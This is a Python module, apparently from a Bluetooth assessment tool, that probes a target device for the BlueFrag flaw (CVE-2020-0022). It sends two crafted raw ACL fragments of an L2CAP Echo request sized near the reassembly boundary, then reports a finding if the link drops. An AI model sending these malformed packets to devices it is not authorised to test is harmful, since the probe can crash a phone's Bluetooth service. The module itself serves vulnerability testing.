"""DarkFirmware-backed raw ACL behavioral probes."""

from __future__ import annotations

import struct
import time

from blue_tap.modules.assessment.cve_framework import make_cve_finding as _finding
from blue_tap.modules.fuzzing.transport import RawACLTransport


def _check_bluefrag_boundary_probe(address: str, hci: str) -> list[dict]:
    """CVE-2020-0022: near-boundary fragmented Echo probe over raw ACL."""
    hci_idx = int(hci.replace("hci", "")) if hci.startswith("hci") else 0
    transport = RawACLTransport(address, hci_dev=hci_idx, timeout=5.0)
    if not transport.connect():
        return [_finding(
            "INFO", "CVE-2020-0022: Not Applicable",
            "BlueFrag raw ACL probe skipped — DarkFirmware raw ACL transport could not "
            "establish or observe an ACL link to the target.",
            cve="CVE-2020-0022", status="not_applicable", confidence="high",
            evidence="RawACL transport unavailable for this target/session",
        )]

    try:
        # Safe near-boundary probe from the spec:
        # Packet 1 carries L2CAP header + Echo command header only.
        # Packet 2 is one byte short of the declared echo payload length.
        declared_l2cap_len = 100
        echo_payload_len = 96
        first_fragment = struct.pack("<HHBBH", declared_l2cap_len, 0x0001, 0x08, 0x01, echo_payload_len)
        second_fragment = b"\xAA" * 95

        sent1 = transport._hci_vsc.send_raw_acl(transport._connection_handle, first_fragment, pb=0x02)
        time.sleep(0.05)
        sent2 = transport._hci_vsc.send_raw_acl(transport._connection_handle, second_fragment, pb=0x03)
        if not sent1 or not sent2:
            return [_finding(
                "MEDIUM", "CVE-2020-0022: Inconclusive",
                "BlueFrag raw ACL probe could not inject both crafted ACL fragments.",
                cve="CVE-2020-0022", status="inconclusive", confidence="medium",
                evidence="Raw ACL fragment injection failed",
            )]

        previews = []
        deadline = time.time() + 1.5
        while time.time() < deadline:
            raw = transport.recv(recv_timeout=0.2)
            if not raw:
                continue
            if len(raw) >= 14 and raw[:4] == b"RXLC":
                previews.append(struct.pack("<II", struct.unpack_from("<I", raw, 6)[0],
                                            struct.unpack_from("<I", raw, 10)[0]))

        alive = transport.is_alive()
        if not alive:
            return [_finding(
                "HIGH",
                "BlueFrag ACL Reassembly Crash/Disconnect (CVE-2020-0022)",
                "The target dropped the BR/EDR ACL link immediately after the near-boundary "
                "fragmented Echo probe, consistent with the vulnerable BlueFrag reassembly path.",
                cve="CVE-2020-0022",
                impact="Pre-auth Android Bluetooth daemon crash / potential RCE on affected releases",
                remediation="Apply the Android packet_fragmenter bounds-check fix.",
                status="confirmed",
                confidence="medium",
                evidence="ACL link disappeared after fragmented Echo probe",
            )]

        return [_finding(
            "MEDIUM", "CVE-2020-0022: Inconclusive",
            "The near-boundary fragmented Echo probe was delivered, but the target remained "
            "stable and the observed ACL previews did not provide a definitive differential.",
            cve="CVE-2020-0022", status="inconclusive", confidence="medium",
            evidence=f"Observed {len(previews)} RX ACL preview(s); ACL remained established",
        )]
    finally:
        transport.close()
